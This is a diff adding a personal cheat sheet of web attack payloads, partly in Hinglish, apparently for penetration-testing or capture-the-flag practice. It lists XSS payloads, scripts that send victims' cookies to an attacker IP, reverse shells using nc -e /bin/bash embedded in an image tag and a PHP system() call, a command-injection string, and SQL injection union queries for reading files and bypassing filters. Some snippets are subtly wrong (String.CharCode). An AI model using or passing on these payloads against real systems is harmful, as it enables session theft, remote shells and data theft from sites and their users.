@@ -1,0 +1,38 @@
+Xss payloads;
+<ScRiPt>alert("hello world")</ScRiPt>
+<body onload="alert(document.cookie)">
+<img src=x onerror="alert(document.cookie)">
+for getting reverse shell :  <img src=http://192.168.43.224/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'192.168.43.224'$IFS'1234')>
+to bypass the filter: 
+Payload: <script>eval(String.CharCode(<revrse_shell_command_to_execute>));</script>
+<script>document.location='http://192.168.43.224/?c='+document.cookie</script>   // for stealing cookie we have to execute this script on victim browser or webserver,and start a netcat listener on port 80 .... you will get a request containing user cookie
+before injecting the payload directly first check the encryption type using burpsuite intercept the request. sometimes utf-8 url encryption was there or sometime base 64 encryption is there
+<img src=x onerror=this.src="http://192.168.43.224/?c="+btoa(document.cookie)/>  // for stealing cookie we have to execute this script on victim browser or webserver,and start a netcat listener on port 80 .... you will get a request containing user cookie
+
+<img src="x/><script>javascript.alert(0)</script>">
+
+
+
+
+php payloads
+<?php system("nc 10.10.14.53 -e /bin/bash") ?>
+radha;phpinfo();
+
+sqlpayload:
+suppose in an input fild we have to put parameter and on putting parameter' if we get an sql error then the page is vulnerable with sql
+parameter'+order+by+3---
+bsically three ki jagah woh highest number dalo jo result de raha ho
+parameter'+union+select+1,2,3----
+%1$\') UNION SELECT 1;---- for bypassing vsprintf() php filter
+%1$\') UNION SELECT 1;#    for bypassing vsprintf() php filter
+%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,([SQL QUERY HERE])))# for bypassing vsprintf() php filter
+user()
+system_user()
+parameter'+union+select+1,LOAD_FILE('c:/windows/system32/licesnse.rtf'),3----               // loading files assuming there are 3 coloumns and instead of 2 coloumn we are loding licesnse.rtf ..
+parameter'+union+select+1,@@datadir,3----                              // gives the dir where sql data is stored
+
+for blind attacks:
+sometimes it happens that we are able to execute the code but not able to see its result for that we have to execute the code in such a manner that victims have to hit back our listener:
+  
+// bypassing the filter of commands:
+<img src="x/><script>eval(String.CharCode(<payload>));</script>">          // here paylaod should be jenerated from /home/tvaeneir/payload_generater/jsencrypt.py // payload is basically command to execute , try to run any script stored in our http server 
